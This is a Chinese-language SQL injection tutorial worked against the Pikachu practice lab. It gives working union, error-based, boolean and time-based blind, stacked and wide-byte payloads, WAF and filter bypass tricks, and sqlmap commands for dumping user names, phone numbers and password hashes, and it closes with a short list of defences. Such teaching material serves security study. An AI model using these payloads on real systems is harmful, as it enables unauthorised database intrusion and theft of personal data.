### SQL注入原理
SQL注入就是指Web应用程序对用户输入数据的合理性没有进行判断，前端传入后端的参数是攻击者可控制的，并且根据参数带入数据库查询，攻击者可以通过构造不同的SQL语句来对数据库进行任意查询。下面以PHP语句为例作为展示：

query "select * from users where id=_GET['id']";

### SQL注入条件
用户可以控制数据的输入。

原本要运行的代码拼接了用户的输入并运行。

**基本知识（Mysql）**

**注入点检测**

**页面返回正常**

and 1=1--+

or 1=2--+

**页面返回异常**

<font style="color:#4F4F4F;">and 1=2--+</font>

<font style="color:#4F4F4F;">or 1=1--+</font>



### SQL注入技术
![](https://cdn.nlark.com/yuque/0/2025/png/39223720/1762498875314-2c707595-3d58-4abe-8d8d-8d7d944b2fcf.png)

### <font style="color:#F33B45;">U</font>nion注入攻击(联合查询注入)
利用union查询来运行想要的sql语句

字符型注入，目标：获取当前数据库中的所有用户名及其他感兴趣的信息。

#### 注入点判断
d' and 1=1#



![](https://cdn.nlark.com/yuque/0/2025/png/39223720/1762498875578-e3432f42-618a-4633-9b42-5d58837f88cb.png)

<font style="color:#4D4D4D;"> </font><font style="color:#F33B45;">字符型注入点</font><font style="color:#4D4D4D;">，使用</font><font style="color:#F33B45;">单引号</font><font style="color:#4D4D4D;">闭合即可</font>

#### 字段判断
order by 1和2时没有问题

<font style="color:#F33232;">order by 后面可以加列名，也可以加数字，数字应是小于等于查询结果的列数，所以可以慢慢增加，当出错时，查询结果就是出错时的数字-1。</font>

d' order by 3#

没有找到3这一列  #下面的回显我们-1试试

![](https://cdn.nlark.com/yuque/0/2025/png/39223720/1762498875813-9d58f719-1ca4-4d0a-ba16-e84ad812ea2b.png)

d' order by 2#   没有报错



![](https://cdn.nlark.com/yuque/0/2025/png/39223720/1762498876077-e30151da-01df-4791-8fc1-f1c78e555749.png)

字段数为<font style="color:#f33b45;">2</font>，有回显，union没有被过滤，使用Union注入

sql语句猜测，从某个表根据用户名返回两个字段

<font style="color:#4f4f4f;">select field1,field2 from table where 用户名 = ''</font>

#### 查询当前数据库
当前的用database()函数即可

d' union select 1,database() from information_schema.schemata#



![](https://cdn.nlark.com/yuque/0/2025/png/39223720/1762498876442-62dfba57-2409-4366-9b4e-bd08c174cef0.png)

<font style="color:#4D4D4D;"> 得到数据库名</font><font style="color:#F33B45;">pikachu</font>

#### 查询表名
d' UNION SELECT 1,table_name from information_schema.tables where table_schema='pikachu'#

<font style="color:#4D4D4D;">查询到的表</font>



![](https://cdn.nlark.com/yuque/0/2025/png/39223720/1762498876660-3a08ac05-7419-4a1d-aa8a-1c89a20f874b.png)

<font style="color:#4D4D4D;">得到表名</font><font style="color:#F33B45;">httpinfo、member、message、users、xssblind</font>

#### 查询列名
根据我们的目标，假设对member(成员)感兴趣

<font style="color:#F33232;">#查询member表中的列名</font>

d' union select 1,column_name from information_schema.columns where table_schema='pikachu' and table_name='member'#

<font style="color:#F33232;">#查询httpinfo表中的列名</font>

d' union select 1,column_name from information_schema.columns where table_schema='pikachu' and table_name='httpinfo'#

![](https://cdn.nlark.com/yuque/0/2025/png/39223720/1762498876909-3df9bad3-eabc-4211-bda7-37f0adaede9c.png)

#### 查询所需字段值
<font style="color:#4D4D4D;">有了username就可以通过他给的表单获取对应email，所以就假设我们对phone、address更感兴趣，0x3a是冒号':'，0x7e是~。</font>

<font style="color:#F33232;">group_concat()</font>**<font style="color:#F33232;">将多行字符串拼接成一行</font>**

d' union select 1,group_concat(username,0x3a,phonenum,0x3a,address) from member#



![](https://cdn.nlark.com/yuque/0/2025/png/39223720/1762498877125-86ffca95-88de-4b96-b84a-de6ee384aece.png)

#### <font style="color:#F33B45;">E</font>rror注入攻击报错注入
<font style="color:#FF0001;">如果union被过滤，可以使用基于错误的注入攻击，一般利用floor，updatexml, extractvalue函数</font><font style="color:#4D4D4D;">、还有exp和一些几何函数，补充exp：</font>Error Based SQL Injection Using EXP | 🔐Blog of Osand<font style="color:#4D4D4D;">a。利用了"DOUBLE value is out of range"</font>。

Floor函数报错

关键函数：

Rand() -------产生0~1的伪随机数

Floor() -------向下取整数

Concat() -----连接字符串

Count() ------计算总数

<font style="color:#4D4D4D;">Payload如下：</font>

<font style="color:#4D4D4D;">Select count(*),concat(PAYLOAD,floor(rand(0)*2))x from 表名 group by x;</font>

![](https://cdn.nlark.com/yuque/0/2025/png/39223720/1762498877366-2db17741-9c69-4697-a52f-28ccc16d2e48.png)

<font style="color:#F33232;">floor和rand(0)产生重复序列</font>

<font style="color:#4D4D4D;">根据x字段进行分组，统计x的个数</font>



![](https://cdn.nlark.com/yuque/0/2025/png/39223720/1762498877648-49125722-9801-4958-86e9-0da76b6b5344.png)

**<font style="color:#4D4D4D;">字符型注入，目标：获取当前数据库中的users表中的所有用户名及其他感兴趣的信息。</font>**

注入点和字段数判断同上，已知：

<font style="color:#f33b45;">字符型注入点</font>，使用<font style="color:#f33b45;">单引号</font>闭合即可

字段数为<font style="color:#f33b45;">2</font>，有回显，updatexml没有被过滤，使用报错注入

**#0x7e代表的是~号**

**LIMIT语法**

语法：

<font style="color:#4F4F4F;">limit m,n</font>

<font style="color:#f33232;">从m位置开始，取n条记录</font>

**<font style="color:#000000;">查询表名</font>**

d' and updatexml(1,concat(0x7e,(SELECT table_name from information_schema.tables where table_schema=database() limit 0,1),0x7e),1)#



![](https://cdn.nlark.com/yuque/0/2025/png/39223720/1762498877827-0e743976-250a-465b-b91f-38fcabeca734.png)

<font style="color:#4D4D4D;">注意，结果只能是一行，所以使用了limit 0,1获得第一个表</font>

<font style="color:#4D4D4D;">当sql语句是使用 limit 3,1是时候就可以得到了users表。</font>

![](https://cdn.nlark.com/yuque/0/2025/png/39223720/1762498878047-bfed6b01-80ad-4fa9-8943-8422ec31d3a1.png)

** 查询列名**

d' and updatexml(1,concat(0x7e,(SELECT column_name from information_schema.columns where table_schema=database() and table_name='users' limit 0,1),0x7e),1)#

**#共有一下几列**

![](https://cdn.nlark.com/yuque/0/2025/png/39223720/1762498878282-f49f9fdd-d19f-41e9-96ea-bda8538fd952.png)

**查询到的列名**

![](https://cdn.nlark.com/yuque/0/2025/png/39223720/1762498878489-529aac44-e14c-4cbd-8a51-6f2bf6b989e1.png)

<font style="color:#4D4D4D;">同样，当sql语句是使用 limit 1,1、limit 2,1、limit 3,1时，就得到了username、password、level三个列名。</font>

#### 查询所需字段值
<font style="color:#4D4D4D;">假设我们对username和password感兴趣</font>

d' and updatexml(1,concat(0x7e,(SELECT group_concat(username,0x3a,password) from users limit 0,1),0x7e),1)#

![](https://cdn.nlark.com/yuque/0/2025/png/39223720/1762498878788-1cedc381-b184-4a21-acae-0f8a090a6c90.png)

**<font style="color:#FF0001;">可以看出报错注入攻击比较麻烦，如果有回显，union没有被过滤，还是优先使用union注入攻击。</font>**

<font style="color:#FF0001;">----------------------------------------没有回显-----------------------------------------------</font>

**<font style="color:#4D4D4D;">接下来就是难度中等的了，没有回显，采用盲注</font>**

**<font style="color:#F33B45;">B</font>****oolean注入攻击(没有回显)**

基于布尔判断的攻击

根据前面知道有个用户名是vince。

vince' and length(database())=7#

![](https://cdn.nlark.com/yuque/0/2025/png/39223720/1762498878964-6002338e-2096-4c2f-9744-cdf183575386.png)

<font style="color:#FF0001;">没有错误</font>

<font style="color:#4D4D4D;">此时，条件语句where username='</font><font style="color:#FF0001;">vince' and length(database())=7是True，也就是说数据库长度为7。</font>

<font style="color:#f33232;">substr()截取字符串的一部分</font>

![](https://cdn.nlark.com/yuque/0/2025/png/39223720/1762498879326-34d67ee6-2c92-4714-af28-34c089288b95.png)

<font style="color:#FF0001;">字符</font>

vince' and ascii(substr(database(),1,1))=112#

![](https://cdn.nlark.com/yuque/0/2025/png/39223720/1762498879931-8dcce867-e357-47e6-bf5d-3178560df7fa.png)

**<font style="color:#FF0001;">ascii</font>**

vince' and ascii(substr(database(),2,1))=105#

<font style="color:#4D4D4D;">上面是数据库名第二字符'i'的，数据库名出来后再将database()改为select语句去找表名等，一般是写脚本，一个个的手工判断时间太长，有时间写了脚本再来更新，或者使用sqlmap。</font>

python sqlmap.py -u "[<font style="color:#003884;">http://localhost/pikachu/vul/sqli/sqli_blind_b.php?name=d&submit=</font>](http://localhost/pikachu/vul/sqli/sqli_blind_b.php?name=d&submit=)查询" --technique=B -dbms mysql --threads 5 -v 3 -dbs --batch



<font style="color:#4D4D4D;">使用的是MID函数，和substr一样。在</font>网络安全-Mysql注入知识点<font style="color:#4D4D4D;">中有这个函数的用法。</font>

**<font style="color:#F33B45;">T</font>****ime注入攻击时间盲注（无回显）**

<font style="color:#4D4D4D;">基于时间的攻击，利用if、sleep、benchmark、get_lock等函数</font>，使用rpad<font style="color:#4D4D4D;">或</font>repeat<font style="color:#4D4D4D;">构造长字符串，加RLIKE，利用多个大表的笛卡尔积。</font>

<font style="color:#4D4D4D;">GET_LOCK有两个参数，一个是key,表示要加锁的字段，另一个是加锁失败后的等待时间(s</font>[[)<font style="color:#4D4D4D;">，这种绕过方法是存在限制条件的，即</font>**<font style="color:#4D4D4D;">数据库的连接必须是持久连接</font>**

vince' and if(length(database()=7),sleep(3),1)#

![](https://cdn.nlark.com/yuque/0/2025/png/39223720/1762498880182-e680f80d-f1a6-41bd-9486-162af2640ad8.png)

<font style="color:#4D4D4D;">同样，也是写脚本，通过返回的时间长短判断，可使用sqlmap。</font>

python sqlmap.py -u "[<font style="color:#003884;">http://127.0.0.1/pikachu/vul/sqli/sqli_blind_t.php?name=d&submit=%E6%9F%A5%E8%AF%A2</font>](http://127.0.0.1/pikachu/vul/sqli/sqli_blind_t.php?name=d&submit=%E6%9F%A5%E8%AF%A2)" --technique=T --time-sec 2 -dbms mysql --threads 5 -v 3 -dbs --batch

<font style="color:#4D4D4D;">太慢了，有其他办法不建议使用这个。</font>



![](https://cdn.nlark.com/yuque/0/2025/png/39223720/1762498880490-0af18c39-33c6-455d-9889-7c13d31c5a7e.png)

**<font style="color:#000000;">堆叠查询注入</font>****<font style="color:#F33B45;">S</font>****tack注入攻击**

需要后台代码是可以执行多条sql语句的，php中是使用<font style="color:#F33B45;">PDO方式</font>执行多条语句。

堆叠注入攻击可以执行多条语句，多语句之间以**<font style="color:#F33B45;">分号</font>**隔开。利用这个特点可以在后面的语句中构造自己要执行的语句。

<font style="color:#FF0001;">获取数据库、表（单引号闭合）</font>

';show databases;show tables;%23

![](https://cdn.nlark.com/yuque/0/2025/png/39223720/1762498880791-d7668b1e-be44-41fd-9124-bce0df2fd43c.png)

<font style="color:#4D4D4D;">可以看到sqlmap中注入技术选择S时，payload中是含分号的。</font>

**<font style="color:#FF0001;">--------------------------------------接下来是比较特殊/高级的sql绕过注入--------------------------------</font>**

**inline ****<font style="color:#F33B45;">Q</font>****uery绕过注入攻击**

### <font style="color:#4D4D4D;">内联查询注入攻击</font>
#### 宽字节绕过注入
<font style="color:#4D4D4D;">宽字节是在一些</font><font style="color:#F33B45;">特定的编码</font><font style="color:#4D4D4D;">，如GBK中才有的，编码将两个字节认为是一个汉字（前一个字符ascii码要大于128，才到汉字的范围）。addslashes函数为了防止sql注入，将传入参数值进行转义，</font><font style="color:#F33B45;">将' 转义为\'，单引号失去作用</font><font style="color:#4D4D4D;">。因此，我们需要将\给绕过，这样才可以加'号。</font>

[<font style="color:#003884;">在线UrlEncode编码 / UrlDecode解码（gbk, big5, utf8） - aTool在线工具 (atool99.com)</font>](https://www.atool99.com/urlencode.php)



![](https://cdn.nlark.com/yuque/0/2025/png/39223720/1762498881074-e9c66bcd-fbea-4673-bd69-3a54831dde98.png)

<font style="color:#FF0001;">\'编码</font>

<font style="color:#4D4D4D;">\编码为%5C,我们一般在地址后添加%df。</font>



![](https://cdn.nlark.com/yuque/0/2025/png/39223720/1762498881289-d6e33f79-a6a7-420e-8526-8a045a9e05ee.png)

<font style="color:#FF0001;">绕过\</font>

添加后\变成了汉字，这样就绕过了。之后就和前面的一样了，当然，还有双引号等，除了GBK还有GB2312等编码，有兴趣的可以整理一下所有的。

<font style="color:#FF0001;">为了方便理解，修改一下源代码，打印一下sql语句 。</font>

![](https://cdn.nlark.com/yuque/0/2025/png/39223720/1762498881502-ea735055-3daa-4808-a94b-889effc4a7a6.png)

<font style="color:#FF0001;">修改源代码</font>

![](https://cdn.nlark.com/yuque/0/2025/png/39223720/1762498881817-5dad1f28-c9ce-4150-8af3-cbd80de070ac.png)

vince' and 1=1#

<font style="color:#4D4D4D;">后端及数据库设置字符集为GBK，或其他低位为%5C的字符集。</font>

%df%5C%27 or 1=1#

**Pikachu其他题目**

<font style="color:#4D4D4D;">火狐浏览器及插件hackbar v2。</font>

### 数字型注入(post)
<font style="color:#F33232;">参数为数字，一般是id等。</font>

1、没有输入框，所以抓包修改

<font style="color:#4D4D4D;">判断是否有注入：id=2 and 1=1页面返回正常</font>

![](https://cdn.nlark.com/yuque/0/2025/png/39223720/1762498882018-97cbda65-d7d4-49d9-bb45-bad12c0d0e94.png)

<font style="color:#f33232;">id=2 and 1=2 页面报错，存在注入  1不等于2为false</font>

![](https://cdn.nlark.com/yuque/0/2025/png/39223720/1762498882227-ef902776-5d16-446f-8bab-2d5e5f404723.png)



<font style="color:#4D4D4D;">2、根据返回内容，可判断可能有两个注入点，通过order by语句判断是否正确</font>

<font style="color:#4D4D4D;">id=2 order by 2没有报错</font>

![](https://cdn.nlark.com/yuque/0/2025/png/39223720/1762498882534-6fbaa699-c113-455b-a62e-1c0ba7fccb0c.png)

<font style="color:#4D4D4D;">id=2 order by 3</font>

![](https://cdn.nlark.com/yuque/0/2025/png/39223720/1762498882740-2550c47f-e93b-4f6d-a443-527b150c1c17.png)

<font style="color:#4D4D4D;">3、尝试union联合来确定注入点</font>

id=2 union select 99,98

![](https://cdn.nlark.com/yuque/0/2025/png/39223720/1762498882962-2bbcd6c9-1e9e-449b-9c96-c3b9478fd2eb.png)

<font style="color:#4D4D4D;">4、开始爆数据库</font>

id=2 union select 99,database()



![](https://cdn.nlark.com/yuque/0/2025/png/39223720/1762498883172-40f214f8-814f-4992-a8b9-7ba496fc5ecd.png)

<font style="color:#4D4D4D;">数据库名称：</font>pikachu

<font style="color:#4D4D4D;">5、根据pikachu，爆表名，union</font>联合查询<font style="color:#4D4D4D;">需要借助information_schema数据库，来查询当前数据库信息，information_schema是mysql自带的数据库</font>

id=2 union select 99,table_name from information_schema.tables where table_schema = 'pikachu'



![](https://cdn.nlark.com/yuque/0/2025/png/39223720/1762498883360-be67d795-64bf-4d64-bb3e-854402805e6d.png)



![](https://cdn.nlark.com/yuque/0/2025/png/39223720/1762498883658-cdf5e223-5a20-40b5-9242-b58a70cea04b.png)



<font style="color:#4D4D4D;">可以看到存在一个users表，猜测用户、密码放在里面</font>

<font style="color:#4D4D4D;">6、根据users表，爆列名</font>

union select 99,column_name from information_schema.columns where table_name='users'



![](https://cdn.nlark.com/yuque/0/2025/png/39223720/1762498883883-b8282e4e-40b9-4ac3-ad7b-d366647930c1.png)



![](https://cdn.nlark.com/yuque/0/2025/png/39223720/1762498884110-8776a74a-8f68-40f1-acc6-f9a9e093b664.png)

<font style="color:#4D4D4D;">可以看出存在user、password列</font>

<font style="color:#4D4D4D;">7、最后一步，根据表，爆数据</font>



![](https://cdn.nlark.com/yuque/0/2025/png/39223720/1762498884268-bc6bb598-e4d8-4504-98e6-1aa3e383ccac.png)



![](https://cdn.nlark.com/yuque/0/2025/png/39223720/1762498884466-2bfb55e3-e521-4b5b-bd96-542028816a2e.png)

<font style="color:#4D4D4D;">密码是md5加密，通过在线解密就可以</font>

<font style="color:#4D4D4D;">0x3a是冒号的ASCII码</font>

<font style="color:#4D4D4D;">一次手工注入的基本过程如上所述，接下来大部分只讲原理，有特殊的地方再提示。</font>

### <font style="color:#4D4D4D;">字符型注入</font>
<font style="color:#F33232;">将参数以字符或字符串形式读入，通过闭合+注释的方式来进行SQL注入，一般是'或"，或者结合()。</font>

#### 判断闭合


![](https://cdn.nlark.com/yuque/0/2025/png/39223720/1762498884718-7b5ea7f7-0f02-4fba-a2f9-2f5899133937.png)

<font style="color:#999999;">标题</font>

#### 获取数据
[<font style="color:#003884;">http://127.0.0.1/pikachu/vul/sqli/sqli_str.php?name=d</font>](http://127.0.0.1/pikachu/vul/sqli/sqli_str.php?name=d)'union select 1,database()--+&submit=%E6%9F%A5%E8%AF%A2



![](https://cdn.nlark.com/yuque/0/2025/png/39223720/1762498885014-d8ba603c-fcf3-4d86-a736-74e07bf425ec.png)

<font style="color:#FF0001;">获取数据库名</font>

### 搜索型注入
其实也算是字符型注入

搜索一般sql语句如下，

<font style="color:#FF0001;">select * from users where username like '%$name'</font>

![](https://cdn.nlark.com/yuque/0/2025/png/39223720/1762498885322-bf9e0b90-72db-4e67-acb9-bc8b8914d946.png)

<font style="color:#FF0001;">测试闭合字符</font>



![](https://cdn.nlark.com/yuque/0/2025/png/39223720/1762498885567-836ea50a-89ee-470c-9789-eb2fad8ada66.png)

<font style="color:#4D4D4D;">使用'or 1=1，条件判断为TRUE，所有的都返回，想获取其他的你就从前面常用语句去粘贴就行了。</font>

### xx型注入
<font style="color:#FF0001;">其实还是字符型，只不过需要两个字符去闭合，就是前面提到的()，sql语句类型下面这种,和前面的差不多。</font>

<font style="color:#4F4F4F;">select * from users where username = ('$name')</font>

**注入判断**

![](https://cdn.nlark.com/yuque/0/2025/png/39223720/1762498885809-19d2a943-f711-44b6-8a31-e6f28ccb3975.png)

** "insert/update"注入**



![](https://cdn.nlark.com/yuque/0/2025/png/39223720/1762498885993-105f3b3d-b79e-4a29-8277-7a2863cbc315.png)

<font style="color:#4D4D4D;">0x7e是~，结果如下：</font>

![](https://cdn.nlark.com/yuque/0/2025/png/39223720/1762498886170-48d60d8b-9542-428d-9182-ae64a499fb77.png)

<font style="color:#FF0001;">数据库</font>

**"delete注入"**

<font style="color:#4D4D4D;">和上面的差不多,id那里可以报错注入，可以使用Burpsuite进行抓包。</font>

宽字节注入

### sql注入绕过
#### 大小写绕过
<font style="color:#4D4D4D;">sql语句对一些关键词不区分大小写，如果网站代码没有进行大小写检查可以使用</font>

<font style="color:#4F4F4F;">UniOn select * from user</font>

#### 双写绕过
网站代码找到关键词后删除，可以通过双写构造删除后符合语法的sql语句

<font style="color:#4F4F4F;">selselectect * from user</font>

#### 内联注释
<font style="color:#4D4D4D;">mysql扩展功能，在/*后加惊叹号，注释中的语句会被执行</font>

<font style="color:#4F4F4F;">and /*!select * from user*/</font>



![](https://cdn.nlark.com/yuque/0/2025/png/39223720/1762498886335-15f6bb91-359e-4a56-9b3e-09a283c40bf7.png)

#### 注释符绕过
注释符不影响语句的连接，

<font style="color:#4F4F4F;">sel/**/ect * from user</font>



#### or/and绕过
<font style="color:#4D4D4D;">使用逻辑符号代替：and = &&, or = ||</font>

<font style="color:#4F4F4F;">select * from emp where sal > 500 && sal < 3000;</font>

#### 空格绕过
<font style="color:#4D4D4D;">有的网站过滤了空格，可以尝试使用</font>

<font style="color:#4F4F4F;">%0a、%b、%0c、%0d、%09、%a0</font>

<font style="color:#4D4D4D;">或者</font>

<font style="color:#4F4F4F;">/**/、()</font>

<font style="color:#4D4D4D;">例如</font>

<font style="color:#4F4F4F;"> select * from/**/emp where (sal) > 500 && sal < 3000;</font>

<font style="color:#4D4D4D;">等价于</font>

<font style="color:#4F4F4F;">select * from emp where sal > 500 and sal < 3000;</font>

### <font style="color:#DF2A3F;">防御SQL注入的方法</font>
#### 使用预编译语句
<font style="color:#4D4D4D;">绑定变量，攻击者无法改变SQL的结构。不同的编程语言Java、Php有不同的语法，就不做展示了。在</font>[<font style="color:#003884;">网络安全-php安全知识点</font>](https://blog.csdn.net/lady_killer9/article/details/108978062)<font style="color:#4D4D4D;">中提到了使用pdo来防御。</font>

#### 使用存储过程
<font style="color:#4D4D4D;">使用安全的存储过程对抗SQL注入，由于存储过程中也可能存在SQL注入问题，应尽量避免使用动态SQL语句。</font>

#### 检查数据类型
<font style="color:#4D4D4D;">例如，需要输入的是整型，那么，可以判断用户的输入，如果包含非整型，例如，字符串"AND"、“BENCHMARK”等，则不运行sql语句。其他类型，例如，邮箱等可以通过使用正则表达式来进行判断。</font>

#### <font style="color:#4D4D4D;">上web安全防火墙</font>






